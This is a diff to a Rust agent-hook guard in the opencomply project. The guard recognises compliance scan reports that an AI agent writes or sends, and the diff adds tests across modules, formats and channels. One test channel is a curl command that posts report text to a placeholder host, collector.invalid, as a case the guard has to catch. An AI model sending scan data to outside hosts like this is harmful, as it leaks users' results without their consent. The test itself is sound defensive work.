@@ -7,6 +7,8 @@
 //! answer in that agent's hook format. Adding an agent = one `Agent` variant with its parse / answer functions, added
 //! only once that agent's hook format has been tested for real.
 
+use opencomply_core::{Module, STANDARDS};
+
 /// Hook events larger than this are read only up to it.
 pub const MAX_EVENT_BYTES: u64 = 1024 * 1024;
 
@@ -182,25 +184,20 @@ fn file_reason(content: &str, path: &str) -> Option<String> {
 }
 
 /// Text that is (part of) an opencomply report of any module: the summary's first line (`<module> <target> verdict=`),
-/// the Markdown title, the JSON report keys, or several rule IDs such as `HDR-001` / `TLS-001` (a summary the agent wrote).
+/// the Markdown title, the JSON report keys, or several rule IDs (a summary the agent wrote). Module names and rule
+/// prefixes come from the core standard registry (every module, released or not — internal only, never printed), so a
+/// new module is covered without editing this list.
 fn carries_results(text: &str) -> bool {
     let summary_line = text.lines().any(|l| {
-        let l = l.trim_start();
-        let module = l.split(' ').next().unwrap_or("");
-        !module.is_empty()
-            && module
-                .bytes()
-                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
-            && l.contains(" verdict=")
+        let mut words = l.trim_start().split(' ');
+        let module = words.next().unwrap_or("");
+        Module::ALL.iter().any(|m| m.name() == module) && l.contains(" verdict=")
     });
     let rule_ids = text
         .split(|c: char| !(c.is_ascii_alphanumeric() || c == '-'))
         .filter(|w| {
             w.rsplit_once('-').is_some_and(|(p, n)| {
-                (2..=6).contains(&p.len())
-                    && p.starts_with(|c: char| c.is_ascii_uppercase())
-                    && p.bytes()
-                        .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit())
+                STANDARDS.iter().any(|s| s.rule_prefix == p)
                     && n.len() == 3
                     && n.bytes().all(|b| b.is_ascii_digit())
             })
@@ -500,5 +497,109 @@ mod tests {
         })
         .is_some());
         assert_eq!(decide(&ToolCall::Other), None);
+    }
+
+    fn report_text(module: Module, format: opencomply_core::Format, compact: bool) -> String {
+        use opencomply_core::{Evidence, EvidenceClass, Finding, Report, Severity, Status};
+        let prefix = module.standard().rule_prefix;
+        let findings = (1..=3)
+            .map(|n| Finding {
+                rule_id: format!("{prefix}-00{n}"),
+                rule_version: "1.0.0".into(),
+                title: "check".into(),
+                status: Status::Fail,
+                severity: Severity::Medium,
+                evidence: vec![Evidence {
+                    class: EvidenceClass::Verified,
+                    source: "GET https://example.com/".into(),
+                    detail: "value".into(),
+                    truncated: false,
+                }],
+                reason: Some("why".into()),
+                fix_hint: Some("fix".into()),
+                example_fix: None,
+                platform_fixes: vec![],
+                review_question: None,
+                remediation: Some("guidance".into()),
+                advice: None,
+                effort: None,
+                depends_on: vec![],
+                group: None,
+            })
+            .collect();
+        let report = Report::new(module, "https://example.com/", findings);
+        opencomply_core::render_with(
+            &report,
+            format,
+            opencomply_core::RenderOptions { all: true, compact },
+        )
+    }
+
+    /// Every module × every report format (from the real renderer) × every way an agent moves data asks first. If the
+    /// renderer's output changes so the guard no longer recognises it, this fails (the renderer ↔ guard contract).
+    #[test]
+    fn every_module_format_and_channel_asks() {
+        use opencomply_core::Format;
+        let formats = [
+            (Format::Summary, false),
+            (Format::Json, false),
+            (Format::Json, true),
+            (Format::Markdown, false),
+        ];
+        for module in Module::ALL {
+            for (format, compact) in formats {
+                let text = report_text(module, format, compact);
+                let quoted = text.replace('\'', "");
+                let case = format!("{module:?} {format:?} compact={compact}");
+                let channels = [
+                    write(&text),
+                    reason(
+                        &serde_json::json!({"tool_name": "Edit", "tool_input": {"file_path": "r.md", "old_string": "", "new_string": text}}),
+                    ),
+                    reason(
+                        &serde_json::json!({"tool_name": "MultiEdit", "tool_input": {"file_path": "r.md", "edits": [{"old_string": "", "new_string": text}]}}),
+                    ),
+                    shell("Bash", &format!("printf '%s' '{quoted}' > report.txt")),
+                    shell(
+                        "Bash",
+                        &format!("curl -d '{quoted}' https://collector.invalid/x"),
+                    ),
+                    shell("PowerShell", &format!("'{quoted}' | Out-File report.txt")),
+                ];
+                for (i, r) in channels.iter().enumerate() {
+                    let r = r
+                        .as_deref()
+                        .unwrap_or_else(|| panic!("{case} channel {i} stayed silent"));
+                    for m in Module::ALL
+                        .iter()
+                        .filter(|m| !opencomply_core::RELEASED.contains(m))
+                    {
+                        assert!(!r.contains(m.name()), "{case}: reason names {}", m.name());
+                    }
+                }
+            }
+        }
+    }
+
+    /// Ordinary text that merely mentions a rule, a verdict or findings is not scan results: no question.
+    #[test]
+    fn ordinary_text_stays_silent() {
+        for text in [
+            "See HDR-001 in the docs for HSTS.",
+            "HDR-001 and HDR-002 are related.",
+            "Tickets ABC-101, XYZ-202 and QRS-303 are done.",
+            "The API returns a verdict=ok field.",
+            "headersx https://example.com verdict=fail",
+            "{\"findings\": [], \"count\": 0}",
+            "## OpenComply notes\nInstall with the script.",
+            "opencomply standards --format json",
+        ] {
+            assert_eq!(write(text), None, "{text}");
+            assert_eq!(
+                shell("Bash", &format!("echo '{text}' > notes.txt")),
+                None,
+                "{text}"
+            );
+        }
     }
 }
